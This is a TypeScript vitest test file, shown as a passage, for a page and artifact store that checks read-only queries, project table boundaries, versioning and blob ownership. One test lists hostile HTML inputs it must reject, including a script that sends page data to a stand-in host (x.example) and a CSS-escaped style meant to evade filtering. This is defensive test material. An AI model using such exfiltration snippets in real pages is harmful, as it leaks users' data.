import { existsSync, mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { afterEach, beforeEach, describe, expect, it } from "vitest";

import { RoleStore } from "../agents/roles.js";
import { Workspace } from "../store/workspace.js";
import { ProjectManifest } from "./manifest.js";
import { Migrator } from "./migrate.js";
import { DOC_EDIT_MAX, type ArtifactEdit } from "@kos/shared";

import { GUIDE_PARTS } from "./artifactguide.js";
import { EDIT_GAP_MS, EditConflict, PageStore } from "./pages.js";
import { runDisplayQuery } from "./display.js";
import type { LoadedPage, PageRecord } from "./pages.js";

/** A spec page as loaded, or nothing when the page is not one. */
const specOf = (got: LoadedPage | undefined) => (got?.kind === "spec" ? got.spec : undefined);

describe("PageStore", () => {
  let root: string;
  let ws: Workspace;
  let pages: PageStore;

  beforeEach(() => {
    root = mkdtempSync(join(tmpdir(), "kos-pages-"));
    ws = Workspace.open(root);
    const manifest = new ProjectManifest(ws.db);
    manifest.createProject({ name: "Demo", type: "tracker" });
    pages = new PageStore(ws.db, ws, manifest);
  });

  afterEach(() => {
    ws.close();
    rmSync(root, { recursive: true, force: true });
  });

  it("writes, lists, and loads a valid page", () => {
    const rec = pages.write("demo", {
      id: "overview",
      title: "Overview",
      widgets: [
        {
          type: "stat",
          label: "N",
          query: "SELECT 1 AS n",
        },
      ],
    });
    expect(rec.id).toBe("overview");
    expect(pages.list("demo")).toHaveLength(1);
    const got = pages.get("overview");
    expect(specOf(got)?.title).toBe("Overview");
  });

  it("rejects invalid specs", () => {
    expect(() =>
      pages.write("demo", {
        id: "!!!",
        title: "x",
        widgets: [{ type: "stat", label: "n", query: "DELETE FROM x" }],
      }),
    ).toThrow(/invalid page/);
  });
});

describe("runDisplayQuery", () => {
  let root: string;
  let ws: Workspace;

  beforeEach(() => {
    root = mkdtempSync(join(tmpdir(), "kos-dq-"));
    ws = Workspace.open(root);
  });

  afterEach(() => {
    ws.close();
    rmSync(root, { recursive: true, force: true });
  });

  it("runs a select and rejects writes", () => {
    const res = runDisplayQuery(ws.db, "SELECT 1 AS n");
    expect(res.rows[0]).toEqual({ n: 1 });
    expect(() => runDisplayQuery(ws.db, "DELETE FROM x")).toThrow(/read-only/);
  });
});

describe("PageStore mutation targets", () => {
  let root: string;
  let ws: Workspace;
  let pages: PageStore;

  beforeEach(() => {
    root = mkdtempSync(join(tmpdir(), "kos-pages-mut-"));
    ws = Workspace.open(root);
    const manifest = new ProjectManifest(ws.db);
    manifest.createProject({ name: "Budget Tracker", type: "budget" });
    ws.db.exec(`CREATE TABLE budget_tracker_expenses (id INTEGER PRIMARY KEY, amount REAL)`);
    pages = new PageStore(ws.db, ws, manifest);
  });

  afterEach(() => {
    ws.close();
    rmSync(root, { recursive: true, force: true });
  });

  const form = (table: string): unknown => ({
    id: "budget",
    title: "Budget",
    widgets: [
      { type: "form", title: "Log", mutate: { table, columns: ["amount"] } },
    ],
  });

  it("accepts a target naming the physical table", () => {
    expect(pages.write("budget_tracker", form("budget_tracker_expenses")).id).toBe(
      "budget",
    );
  });

  it("names the namespaced table when given the logical one", () => {
    // Written unchecked, this page rendered and then failed on first save
    // with "no such table". The error belongs here, with the fix in it.
    expect(() => pages.write("budget_tracker", form("expenses"))).toThrow(
      /use "budget_tracker_expenses"/,
    );
  });

  it("rejects a target for a table that was never created", () => {
    expect(() => pages.write("budget_tracker", form("nowhere"))).toThrow(
      /systems\.migrate first/,
    );
  });
});

describe("PageStore project boundaries", () => {
  let root: string;
  let ws: Workspace;
  let pages: PageStore;

  beforeEach(() => {
    root = mkdtempSync(join(tmpdir(), "kos-pages-proj-"));
    ws = Workspace.open(root);
    const manifest = new ProjectManifest(ws.db);
    manifest.createProject({ name: "Budget Tracker", type: "budget" });
    manifest.createProject({ name: "Workout Log", type: "tracker" });
    ws.db.exec(`CREATE TABLE budget_tracker_expenses (id INTEGER PRIMARY KEY, amount REAL)`);
    ws.db.exec(`CREATE TABLE workout_log_sets (id INTEGER PRIMARY KEY, reps INTEGER)`);
    pages = new PageStore(ws.db, ws, manifest);
  });

  afterEach(() => {
    ws.close();
    rmSync(root, { recursive: true, force: true });
  });

  const page = (query: string): unknown => ({
    id: "p",
    title: "P",
    widgets: [{ type: "table", title: "T", query }],
  });

  it("accepts a page reading its own project", () => {
    expect(
      pages.write("budget_tracker", page("SELECT * FROM budget_tracker_expenses")).id,
    ).toBe("p");
  });

  it("refuses a page reading another project's tables", () => {
    // Unchecked, the page rendered fine and the only symptom was a stranger
    // sitting in someone else's project on the Projects tab.
    expect(() =>
      pages.write("budget_tracker", page("SELECT * FROM workout_log_sets")),
    ).toThrow(/belongs to project "workout_log"/);
  });

  it("does not mistake a similarly named table for another project", () => {
    ws.db.exec(`CREATE TABLE budget_tracker_workout_log_notes (id INTEGER PRIMARY KEY)`);
    expect(
      pages.write(
        "budget_tracker",
        page("SELECT * FROM budget_tracker_workout_log_notes"),
      ).id,
    ).toBe("p");
  });
});

describe("PageStore stat labels", () => {
  let root: string;
  let ws: Workspace;
  let pages: PageStore;

  beforeEach(() => {
    root = mkdtempSync(join(tmpdir(), "kos-pages-stat-"));
    ws = Workspace.open(root);
    const manifest = new ProjectManifest(ws.db);
    manifest.createProject({ name: "Demo", type: "tracker" });
    pages = new PageStore(ws.db, ws, manifest);
  });

  afterEach(() => {
    ws.close();
    rmSync(root, { recursive: true, force: true });
  });

  it("takes a stat's label from its title when only the title is given", () => {
    // Every widget but this one captions itself with title, so every model
    // tested wrote title and was rejected for a missing label.
    const rec = pages.write("demo", {
      id: "p",
      title: "P",
      widgets: [{ type: "stat", title: "Total spent", query: "SELECT 1" }],
    });
    expect(rec.id).toBe("p");
    expect(specOf(pages.get("p"))?.widgets[0]).toMatchObject({
      label: "Total spent",
    });
  });

  it("leaves an explicit label alone", () => {
    pages.write("demo", {
      id: "q",
      title: "Q",
      widgets: [
        { type: "stat", title: "Caption", label: "Real label", query: "SELECT 1" },
      ],
    });
    expect(specOf(pages.get("q"))?.widgets[0]).toMatchObject({ label: "Real label" });
  });

  it("still rejects a stat with neither", () => {
    expect(() =>
      pages.write("demo", {
        id: "r",
        title: "R",
        widgets: [{ type: "stat", query: "SELECT 1" }],
      }),
    ).toThrow(/stat requires a label/);
  });
});

describe("PageStore HTML pages", () => {
  let root: string;
  let ws: Workspace;
  let pages: PageStore;
  let t: number;

  beforeEach(() => {
    root = mkdtempSync(join(tmpdir(), "kos-html-"));
    ws = Workspace.open(root);
    const manifest = new ProjectManifest(ws.db);
    manifest.createProject({ name: "Budget", type: "tracker" });
    manifest.createProject({ name: "Diary", type: "notes" });
    const migrator = new Migrator(ws.db, manifest);
    migrator.migrate("budget", { op: "create_table", table: "tx", columns: [{ name: "id", type: "INTEGER", primaryKey: true }, { name: "amount", type: "REAL" }] });
    migrator.migrate("diary", { op: "create_table", table: "entries", columns: [{ name: "id", type: "INTEGER", primaryKey: true }, { name: "body", type: "TEXT" }] });
    t = 1000;
    pages = new PageStore(ws.db, ws, manifest, () => (t += 1000));
  });

  afterEach(() => {
    ws.close();
    rmSync(root, { recursive: true, force: true });
  });

  it("writes and loads an HTML page with its declarations, repairing escaped closing tags", () => {
    const rec = pages.writeHtml("budget", {
      id: "budget",
      title: "Budget",
      html: "<h1>Spend</h1><script>kos.query('SELECT 1')<\\/script>",
      capabilities: { writes: [{ table: "budget_tx", columns: ["amount"] }] },
      libraries: ["charts"],
      headline: { label: "Spent", query: "SELECT SUM(amount) FROM budget_tx" },
    });
    expect(rec).toMatchObject({ kind: "html", path: "projects/budget/pages/budget.html" });
    const got = pages.get("budget");
    expect(got?.kind).toBe("html");
    if (got?.kind !== "html") return;
    expect(got.page.html).toContain("</script>");
    expect(got.page.capabilities?.writes?.[0]?.table).toBe("budget_tx");
    expect(got.page.libraries).toEqual(["charts"]);
    expect(pages.list("budget")[0]?.kind).toBe("html");
  });

  it("refuses a bad page: too big, an unknown library, bad declarations, another project's table", () => {
    expect(() => pages.writeHtml("budget", { id: "x", title: "X", html: "a".repeat(400_001) })).toThrow(/characters/);
    expect(() => pages.writeHtml("budget", { id: "x", title: "X", html: "<p>", libraries: ["jquery"] })).toThrow(/not one KOS serves/);
    expect(() => pages.writeHtml("budget", { id: "x", title: "X", html: "<p>", capabilities: { writes: [{ table: "budget_tx" }] } })).toThrow(/editable columns/);
    expect(() => pages.writeHtml("budget", { id: "x", title: "X", html: "<p>", capabilities: { writes: [{ table: "diary_entries", columns: ["body"] }] } })).toThrow(/"diary_entries" is not a table of project "budget"/);
    expect(() => pages.writeHtml("budget", { id: "x", title: "X", html: "<p>", headline: { label: "n", query: "SELECT COUNT(*) FROM diary_entries" } })).toThrow(/headline.query: it reads "diary_entries"/);
    expect(() => pages.writeHtml("budget", { id: "x", title: "X", html: "<p>", capabilities: { writes: [{ table: "tx", columns: ["amount"] }] } })).toThrow(/use "budget_tx"/);
    expect(() => pages.writeHtml("budget", { id: "x", title: "X", html: "<p>", headline: { label: "n", query: "DELETE FROM budget_tx" } })).toThrow(/read-only/);
    expect(() => pages.writeHtml("nope", { id: "x", title: "X", html: "<p>" })).toThrow(/unknown project/);
  });

  it("refuses a page that would try to leave its frame, naming what, and lets ordinary words and code through", () => {
    const leaving = [
      "<script>location.href = 'https://x.example/?d=' + data</script>",
      "<script>window.open('https://x.example')</script>",
      "<form><input name=q></form>",
      "<script>document.querySelector('form').submit()</script>",
      '<meta http-equiv="refresh" content="0;url=https://x.example">',
      '<link rel="prerender" href="https://x.example">',
      '<a href="https://x.example" target="_blank">x</a>',
      '<a href="/x" download>x</a>',
      '<iframe src="https://x.example"></iframe>',
      '<script type="speculationrules">{}</script>',
      '<button onclick="location.assign(1)">go</button>',
    ];
    for (const html of leaving) expect(() => pages.writeHtml("budget", { id: "x", title: "X", html }), html).toThrow(/cannot leave its frame/);
    expect(() =>
      pages.writeHtml("budget", {
        id: "ok",
        title: "Ok",
        html: '<meta charset="utf-8"><p>Pick a location. Fill the form below.</p><script>const target = document.body; if (x == location) {}</script>',
      }),
    ).not.toThrow();
  });

  it("keeps every write as a version and rolls back to one, the rollback kept too", () => {
    pages.writeHtml("budget", { id: "b", title: "One", html: "<p>one</p>" });
    pages.writeHtml("budget", { id: "b", title: "Two", html: "<p>two</p>" });
    expect(pages.history("b").map((v) => v.title)).toEqual(["One", "Two"]);
    pages.rollback("b", 1);
    const got = pages.get("b");
    expect(got?.kind === "html" && got.page.html).toBe("<p>one</p>");
    expect(pages.history("b").map((v) => v.version)).toEqual([1, 2, 3]);
    expect(() => pages.rollback("b", 9)).toThrow(/no version 9/);
  });

  it("adds the blob column to a pages table from before blobs owned artifacts, keeping every row's owner", () => {
    const old = mkdtempSync(join(tmpdir(), "kos-pages-old-"));
    try {
      const w = Workspace.open(old);
      w.db.exec(`CREATE TABLE pages (id TEXT PRIMARY KEY, project_slug TEXT NOT NULL, title TEXT NOT NULL, path TEXT NOT NULL, updated_at INTEGER NOT NULL, kind TEXT NOT NULL DEFAULT 'spec', meta TEXT)`);
      w.db.prepare(`INSERT INTO pages VALUES ('a', 'budget', 'A', 'projects/budget/pages/a.html', 1, 'html', '{}'), ('m', '', 'M', 'artifacts/m.html', 2, 'html', '{}')`).run();
      const store = new PageStore(w.db, w, new ProjectManifest(w.db));
      const cols = (w.db.prepare(`PRAGMA table_info(pages)`).all() as { name: string }[]).map((c) => c.name);
      expect(cols).toContain("blob");
      expect(store.list().map((r) => [r.id, r.projectSlug, r.blob])).toEqual([["m", null, undefined], ["a", "budget", undefined]]);
      // Opening it again changes nothing.
      new PageStore(w.db, w, new ProjectManifest(w.db));
      expect(store.list(null).map((r) => r.id)).toEqual(["m"]);
      w.close();
    } finally {
      rmSync(old, { recursive: true, force: true });
    }
  });

  it("gives a blob's rows from before blob ids the living blob's id, or a retired one when the blob is gone", () => {
    const old = mkdtempSync(join(tmpdir(), "kos-pages-ids-"));
    try {
      const w = Workspace.open(old);
      w.db.exec(`CREATE TABLE pages (id TEXT PRIMARY KEY, project_slug TEXT NOT NULL, title TEXT NOT NULL, path TEXT NOT NULL, updated_at INTEGER NOT NULL, kind TEXT NOT NULL DEFAULT 'spec', meta TEXT, blob TEXT)`);
      w.db.prepare(`INSERT INTO pages VALUES ('a', '', 'A', 'blobs/noter/artifacts/a.html', 1, 'html', '{}', 'noter'), ('b', '', 'B', 'blobs/gone/artifacts/b.html', 2, 'html', '{}', 'gone'), ('c', 'budget', 'C', 'projects/budget/pages/c.html', 3, 'html', '{}', NULL)`).run();
      mkdirSync(join(old, "blobs/noter"), { recursive: true });
      const roles = new RoleStore(w);
      roles.write({ name: "noter", description: "Keeps notes", brief: "You keep notes.", memory: "own" });
      const store = new PageStore(w.db, w, new ProjectManifest(w.db));
      const cols = (w.db.prepare(`PRAGMA table_info(pages)`).all() as { name: string }[]).map((c) => c.name);
      expect(cols).toContain("blob_id");
      expect((w.db.prepare(`SELECT name FROM sqlite_master WHERE type = 'index' AND tbl_name = 'pages'`).all() as { name: string }[]).map((r) => r.name)).toContain("pages_blob_id");
      const byId = new Map(store.list().map((r) => [r.id, r]));
      expect(byId.get("a")).toMatchObject({ blob: "noter", blobId: roles.identity("noter") });
      expect(byId.get("a")?.blobRemoved).toBeUndefined();
      // The blob that made b is gone: its work is kept, under an id no blob made later holds.
      expect(byId.get("b")).toMatchObject({ blob: "gone", blobRemoved: true });
      roles.write({ name: "gone", description: "Back", brief: "Back.", memory: "own" });
      expect(roles.identity("gone")).not.toBe(byId.get("b")?.blobId);
      expect(byId.get("c")?.blob).toBeUndefined();
      // Opening it again changes nothing.
      new PageStore(w.db, w, new ProjectManifest(w.db));
      expect(store.list().find((r) => r.id === "a")?.blobId).toBe(byId.get("a")?.blobId);
      w.close();
    } finally {
      rmSync(old, { recursive: true, force: true });
    }
  });

  it("keeps a blob's artifacts in its folder, apart from the workspace's, and with its folder when the blob goes", () => {
    const roles = new RoleStore(ws);
    roles.write({ name: "noter", description: "Keeps notes", brief: "You keep notes.", memory: "own" });
    const noter = { blob: "noter", id: roles.identity("noter")! };
    const rec = pages.writeHtml(noter, { id: "n", kind: "doc", title: "Notes", html: "<article data-doc><h1>N</h1><p>x</p></article>" });
    expect(rec).toMatchObject({ projectSlug: null, blob: "noter", blobId: noter.id, path: "blobs/noter/artifacts/n.html" });
    expect(rec.blobRemoved).toBeUndefined();
    pages.writeHtml(null, { id: "w", title: "W", html: "<p>w</p>" });
    expect(pages.list(noter).map((r) => r.id)).toEqual(["n"]);
    expect(pages.list(null).map((r) => r.id)).toEqual(["w"]);
    // Its history lives beside it, and an edit or a restore keeps it the blob's.
    expect(existsSync(join(root, "blobs/noter/artifacts/.history/n/1.json"))).toBe(true);
    expect(pages.applyEdit("n", { doc: "<h1>N</h1><p>y</p>" }, rec.updatedAt).blob).toBe("noter");
    expect(pages.rollback("n", 1).blobId).toBe(noter.id);
    expect(() => pages.writeHtml({ blob: "../x", id: "x" }, { id: "z", title: "Z", html: "<p>" })).toThrow(/not a blob's name/);
    // The blob is removed: its file goes, its folder stays with the work in it, artifacts and all, as its files do.
    expect(roles.remove("noter")).toBe(true);
    expect(existsSync(join(root, "blobs/noter/blob.md"))).toBe(false);
    expect(existsSync(join(root, "blobs/noter/artifacts/n.html"))).toBe(true);
    expect(pages.list(noter).map((r) => [r.id, r.blobRemoved])).toEqual([["n", true]]);
    // The owner can still restore it, where it is.
    expect(pages.rollback("n", 2)).toMatchObject({ blobId: noter.id, blobRemoved: true });
    // A blob made again under the name is a new owner: none of the old one's is its.
    roles.write({ name: "noter", description: "Keeps notes again", brief: "You keep notes.", memory: "own" });
    const again = { blob: "noter", id: roles.identity("noter")! };
    expect(again.id).not.toBe(noter.id);
    expect(pages.list(again)).toEqual([]);
    expect(() => pages.writeHtml(again, { id: "n", kind: "doc", title: "Mine", html: "<article data-doc><h1>M</h1></article>" })).toThrow(/is the blob noter's, so it is not written as the blob noter's/);
    expect(pages.get("n")?.record.blobId).toBe(noter.id);
    // Moved to the workspace, by a caller that checked it, it takes its history.
    pages.writeHtml(null, { id: "n", title: "Notes", html: "<p>moved</p>" }, { from: noter });
    expect(existsSync(join(root, "artifacts/.history/n/1.json"))).toBe(true);
    expect(pages.get("n")?.record.blob).toBeUndefined();
  });

  it("retires a blob's id when it is removed or made again, never because its file is missing for a moment", () => {
    const roles = new RoleStore(ws, pages.blobIds);
    roles.write({ name: "noter", description: "Keeps notes", brief: "You keep notes.", memory: "own" });
    const first = roles.identity("noter")!;
    pages.writeHtml({ blob: "noter", id: first }, { id: "n", title: "Notes", html: "<p>n</p>" });
    // An editor saving by rename: the file is gone between two calls, and back.
    const file = join(root, "blobs/noter/blob.md");
    const text = readFileSync(file, "utf8");
    rmSync(file);
    expect(roles.identity("noter")).toBeUndefined();
    expect(pages.blobIds.removed(first)).toBe(false);
    writeFileSync(file, text);
    expect(roles.identity("noter")).toBe(first);
    // An edit through the store is the same blob.
    roles.write({ name: "noter", description: "Keeps more notes", brief: "You keep notes.", memory: "own" });
    expect(roles.identity("noter")).toBe(first);
    // Its folder deleted out of band, then the blob made again: a new owner, holding none of the old one's.
    rmSync(join(root, "blobs/noter"), { recursive: true });
    roles.write({ name: "noter", description: "Again", brief: "You keep notes.", memory: "own" });
    const again = roles.identity("noter")!;
    expect(again).not.toBe(first);
    expect(pages.blobIds.removed(first)).toBe(true);
    expect(pages.list({ blob: "noter", id: again })).toEqual([]);
  });

  it("retires a blob's id as soon as its folder is found gone, and not for its file alone", () => {
    const roles = new RoleStore(ws, pages.blobIds);
    roles.write({ name: "noter", description: "Keeps notes", brief: "You keep notes.", memory: "own" });
    roles.write({ name: "keeper", description: "Keeps", brief: "Keep.", memory: "own" });
    const gone = roles.identity("noter")!;
    const kept = roles.identity("keeper")!;
    pages.writeHtml({ blob: "noter", id: gone }, { id: "n", title: "Notes", html: "<p>n</p>" });
    // blob.md moved aside: the folder is there, so the blob is.
    rmSync(join(root, "blobs/keeper/blob.md"));
    expect(roles.retireDeleted()).toEqual([]);
    expect(pages.blobIds.removed(kept)).toBe(false);
    // The folder deleted by hand: retired on the next look, no boot needed.
    rmSync(join(root, "blobs/noter"), { recursive: true });
    expect(roles.identity("noter")).toBeUndefined();
    expect(pages.blobIds.removed(gone)).toBe(true);
    expect(pages.record("n")).toMatchObject({ blob: "noter", blobRemoved: true });
    expect(roles.retireDeleted()).toEqual([]);
  });

  it("retires at boot, once, the id of a blob whose folder went while KOS was away", () => {
    const roles = new RoleStore(ws, pages.blobIds);
    roles.write({ name: "noter", description: "Keeps notes", brief: "You keep notes.", memory: "own" });
    roles.write({ name: "keeper", description: "Keeps", brief: "Keep.", memory: "own" });
    const gone = roles.identity("noter")!;
    const kept = roles.identity("keeper")!;
    rmSync(join(root, "blobs/noter"), { recursive: true });
    expect(roles.reconcile()).toEqual(["noter"]);
    expect(pages.blobIds.removed(gone)).toBe(true);
    expect(pages.blobIds.removed(kept)).toBe(false);
    expect(roles.reconcile()).toEqual([]);
    // Made again by hand afterwards, it is a new blob.
    mkdirSync(join(root, "blobs/noter"), { recursive: true });
    writeFileSync(join(root, "blobs/noter/blob.md"), readFileSync(join(root, "blobs/keeper/blob.md"), "utf8").replace("name: keeper", "name: noter"));
    expect(roles.identity("noter")).not.toBe(gone);
  });

  it("takes a blob whose name has an underscore, as a blob's name may", () => {
    const roles = new RoleStore(ws);
    roles.write({ name: "price_watch", description: "Watches prices", brief: "Watch.", memory: "own" });
    const rec = pages.writeHtml({ blob: "price_watch", id: roles.identity("price_watch")! }, { id: "pw", title: "Prices", html: "<p>p</p>" });
    expect(rec.path).toBe("blobs/price_watch/artifacts/pw.html");
  });

  it("never lets a write take another owner's artifact by naming its id, unless the caller checked whose it was", () => {
    const roles = new RoleStore(ws);
    roles.write({ name: "noter", description: "Keeps notes", brief: "You keep notes.", memory: "own" });
    const noter = { blob: "noter", id: roles.identity("noter")! };
    pages.writeHtml(noter, { id: "notes", title: "Notes", html: "<p>notes</p>" });
    pages.writeHtml("diary", { id: "theirs", title: "Theirs", html: "<p>theirs</p>" });
    const spec = (id: string) => ({ id, title: "Taken", widgets: [{ type: "markdown", content: "x" }] });
    for (const id of ["notes", "theirs"]) {
      expect(() => pages.write("budget", spec(id))).toThrow(/so it is not written as project budget's/);
      expect(() => pages.writeHtml("budget", { id, title: "Taken", html: "<p>x</p>" })).toThrow(/not written as project budget's/);
      // A caller naming the wrong owner as checked is refused too.
      expect(() => pages.writeHtml("budget", { id, title: "Taken", html: "<p>x</p>" }, { from: "budget" })).toThrow(/not written/);
    }
    expect(pages.get("notes")).toMatchObject({ record: { title: "Notes", blobId: noter.id }, page: { html: "<p>notes</p>" } });
    expect(pages.get("theirs")).toMatchObject({ record: { title: "Theirs", projectSlug: "diary" }, page: { html: "<p>theirs</p>" } });
  });

  it("refuses the owner's restore made on an older version, as an edit is refused", () => {
    let clock = 1_000;
    const timed = new PageStore(ws.db, ws, new ProjectManifest(ws.db), () => clock);
    const opened = timed.writeHtml("budget", { id: "r", title: "One", html: "<p>one</p>" }).updatedAt;
    clock += 5_000;
    const now = timed.writeHtml("budget", { id: "r", title: "Two", html: "<p>two</p>" }).updatedAt;
    expect(() => timed.rollback("r", 1, opened)).toThrow(EditConflict);
    expect(timed.rollback("r", 1, now).title).toBe("One");
  });

  it("shows an older version to look at, writing nothing", () => {
    pages.writeHtml("budget", { id: "v", title: "One", description: "first", html: "<p>one</p>" });
    pages.writeHtml("budget", { id: "v", title: "Two", html: "<p>two</p>" });
    expect(pages.version("v", 1)).toEqual({ id: "v", title: "One", description: "first", html: "<p>one</p>" });
    expect(pages.version("v", 3)).toBeUndefined();
    expect(pages.version("nope", 1)).toBeUndefined();
    expect(pages.history("v")).toHaveLength(2);
    const got = pages.get("v");
    expect(got?.kind === "html" && got.page.html).toBe("<p>two</p>");
  });

  it("still writes, versions and renders a spec page, and lets a spec page become HTML", () => {
    pages.write("budget", { id: "old", title: "Old", widgets: [{ type: "stat", label: "N", query: "SELECT 1 AS n" }] });
    expect(pages.get("old")?.kind).toBe("spec");
    pages.writeHtml("budget", { id: "old", title: "New", html: "<p>new</p>" });
    expect(pages.get("old")?.kind).toBe("html");
    expect(existsSync(join(root, "projects/budget/pages/old.json"))).toBe(false);
    pages.rollback("old", 1);
    const back = pages.get("old");
    expect(back?.kind === "spec" && back.spec.title).toBe("Old");
  });

  it("removes a page with its history", () => {
    pages.writeHtml("budget", { id: "gone", title: "Gone", html: "<p>" });
    expect(pages.remove("gone")).toBe(true);
    expect(existsSync(join(root, "projects/budget/pages/.history/gone"))).toBe(false);
  });

  describe("artifact kinds", () => {
    const doc = (body: string): string => `<style>h1{color:var(--text)}</style><article data-doc><h1>Plan</h1>${body}</article><script>kos.theme</script>`;
    const book = { sheets: [{ name: "Spend", columns: [{ label: "Item" }, { label: "Amount", type: "currency", currency: "CAD" }], rows: [["Rent", 1200], ["Food", 300]], totals: { Amount: "sum" } }] };
    const sheet = (b: unknown): string => `<h1>Spend</h1><script type="application/json" data-sheet>${JSON.stringify(b)}</script>`;
    /** The owner's edit, made on the newest version. */
    const edit = (id: string, change: ArtifactEdit): PageRecord => pages.applyEdit(id, change, pages.get(id)?.record.updatedAt);

    it("keeps a kind, a description and fonts; an older page reads as a page", () => {
      pages.writeHtml("budget", { id: "old", title: "Old", html: "<p>x</p>" });
      const rec = pages.writeHtml("budget", { id: "brief", kind: "doc", title: "Q3 brief", description: "What changed and why.", fonts: ["newsreader", "public-sans"], html: doc("<p>Hi</p>") });
      expect(rec).toMatchObject({ artifactKind: "doc", description: "What changed and why.", projectSlug: "budget" });
      expect(pages.list("budget").find((r) => r.id === "old")?.artifactKind).toBe("page");
      const got = pages.get("brief");
      expect(got?.kind === "html" && got.page).toMatchObject({ kind: "doc", fonts: ["newsreader", "public-sans"] });
    });

    it("refuses a kind without its structure, an unknown font, and a bad workbook, saying how to fix it", () => {
      expect(() => pages.writeHtml("budget", { id: "d", kind: "doc", title: "D", html: "<p>x</p>" })).toThrow(/<article data-doc>/);
      expect(() => pages.writeHtml("budget", { id: "k", kind: "deck", title: "K", html: "<main data-deck></main>" })).toThrow(/<section> per slide/);
      expect(() => pages.writeHtml("budget", { id: "s", kind: "sheet", title: "S", html: "<h1>S</h1>" })).toThrow(/data-sheet/);
      expect(() => pages.writeHtml("budget", { id: "s", kind: "sheet", title: "S", html: sheet({ sheets: [{ name: "A", columns: [] , rows: [] }] }) })).toThrow(/needs columns/);
      // A pivot tab's columns are worked out, as the guide says, so it may leave them out.
      const pivoted = { sheets: [book.sheets[0], { name: "By item", pivot: { from: "Spend", by: "Item", values: [{ column: "Amount", fn: "sum" }] } }] };
      expect(pages.writeHtml("budget", { id: "p", kind: "sheet", title: "P", html: sheet(pivoted) }).artifactKind).toBe("sheet");
      expect(() => pages.writeHtml("budget", { id: "s", kind: "sheet", title: "S", html: '<script type="application/json" data-sheet>{oops</script>' })).toThrow(/not JSON/);
      expect(() => pages.writeHtml("budget", { id: "f", kind: "doc", title: "F", fonts: ["comic-sans"], html: doc("") })).toThrow(/not one KOS bundles/);
      expect(() => pages.writeHtml("budget", { id: "w", kind: "slides", title: "W", html: "<p>" })).toThrow(/kind is one of/);
    });

    it("holds a sheet over a table to its own project's tables", () => {
      const live = { sheets: [{ name: "Tx", columns: [{ label: "Amount", column: "amount", type: "number" }], source: { table: "budget_tx", key: "id" } }] };
      expect(pages.writeHtml("budget", { id: "ledger", kind: "sheet", title: "Ledger", html: sheet(live) }).artifactKind).toBe("sheet");
      const theirs = { sheets: [{ name: "E", columns: [{ label: "Body", column: "body" }], source: { table: "diary_entries", key: "id" } }] };
      expect(() => pages.writeHtml("budget", { id: "peek", kind: "sheet", title: "Peek", html: sheet(theirs) })).toThrow(/diary_entries.*not a table of project "budget"/);
    });

    it("keeps a workspace artifact under artifacts/, with no tables, files or headline to reach", () => {
      const rec = pages.writeHtml(null, { id: "memo", kind: "doc", title: "Memo", html: doc("<p>Note</p>") });
      expect(rec).toMatchObject({ projectSlug: null, path: "artifacts/memo.html" });
      expect(pages.list(null).map((r) => r.id)).toEqual(["memo"]);
      expect(pages.list("budget").some((r) => r.id === "memo")).toBe(false);
      expect(pages.list().some((r) => r.id === "memo")).toBe(true);
      expect(existsSync(join(root, "artifacts/.history/memo/1.json"))).toBe(true);
      expect(() => pages.writeHtml(null, { id: "w", title: "W", html: "<p>", capabilities: { writes: [{ table: "budget_tx", columns: ["amount"] }] } })).toThrow(/belongs to no project/);
      expect(() => pages.writeHtml(null, { id: "w", title: "W", html: "<p>", headline: { label: "N", query: "SELECT 1" } })).toThrow(/belongs to no project/);
      expect(() => pages.writeHtml(null, { id: "w", title: "W", html: "<p>", capabilities: { files: true } })).toThrow(/belongs to no project/);
    });

    it("moves an artifact between a project and the workspace with its history", () => {
      pages.writeHtml("budget", { id: "move", title: "Move", html: "<p>1</p>" });
      expect(() => pages.writeHtml(null, { id: "move", title: "Move", html: "<p>2</p>" })).toThrow(/is project budget's/);
      pages.writeHtml(null, { id: "move", title: "Move", html: "<p>2</p>" }, { from: "budget" });
      expect(existsSync(join(root, "projects/budget/pages/move.html"))).toBe(false);
      expect(pages.history("move").map((v) => v.version)).toEqual([1, 2]);
      pages.rollback("move", 1);
      const got = pages.get("move");
      expect(got?.kind === "html" && got.page.html).toBe("<p>1</p>");
    });

    it("keeps the owner's edit to a doc as a version, changing only the article's text", () => {
      pages.writeHtml("budget", { id: "brief", kind: "doc", title: "Brief", html: doc("<p>Before</p><aside class=\"callout\"><p>aside</p></aside>") });
      edit("brief", { doc: "<h1>Plan</h1><p>After, <em>edited</em></p>" });
      const got = pages.get("brief");
      expect(got?.kind === "html" && got.page.html).toBe("<style>h1{color:var(--text)}</style><article data-doc><h1>Plan</h1><p>After, <em>edited</em></p></article><script>kos.theme</script>");
      expect(pages.history("brief")).toHaveLength(2);
      pages.rollback("brief", 1);
      expect(pages.get("brief")?.kind === "html" && (pages.get("brief") as { page: { html: string } }).page.html).toContain("Before");
    });

    it("refuses at write a doc whose text the owner could not save back, and saves an edit to one it takes", () => {
      // What the editor would refuse on the owner's first save is refused to the agent now, saying what to change.
      const escaped = () => pages.writeHtml("budget", { id: "esc", kind: "doc", title: "Esc", html: doc('<p style="color:\\72 ed">x</p>') });
      expect(escaped).toThrow(/the text inside <article data-doc> is what the owner edits.*a style that loads or runs something/);
      const offList = () => pages.writeHtml("budget", { id: "off", kind: "doc", title: "Off", html: doc("<p>x</p><marquee>hi</marquee>") });
      expect(offList).toThrow(/<marquee>, which a doc is not made of.*put scripts, styles and anything else outside it/);
      expect(pages.get("esc")).toBeUndefined();
      expect(pages.get("off")).toBeUndefined();
      // A locked doc is not edited in place, so it is not held to an edit.
      pages.writeHtml("budget", { id: "locked", kind: "doc", title: "Locked", html: "<article data-doc data-locked><marquee>hi</marquee></article>" });
      // The guide's own shapes, a chart drawn on a canvas by a script after the article, and the runtime's classes.
      const body =
        '<header><p class="kicker">Brief</p><p class="lede">The point.</p><p class="byline">For ops</p></header><h2>Why</h2><p>Text<span class="fn">A source.</span>.</p>' +
          '<figure class="doc-wide"><svg viewBox="0 0 10 10"><rect width="4" height="8" fill="url(#g)"/></svg><figcaption>Bookings</figcaption></figure>' +
          '<figure><canvas id="trend" width="320" height="120"></canvas><figcaption>Trend</figcaption></figure>' +
          '<blockquote class="pull">Said<cite>Ana</cite></blockquote><aside class="callout warn"><p>Risk</p></aside><table><tr><th class="num">n</th></tr><tr><td class="num">3</td></tr></table>';
      pages.writeHtml("budget", { id: "brief", kind: "doc", title: "Brief", html: doc(body) });
      // The guide's own example, as an agent would copy it.
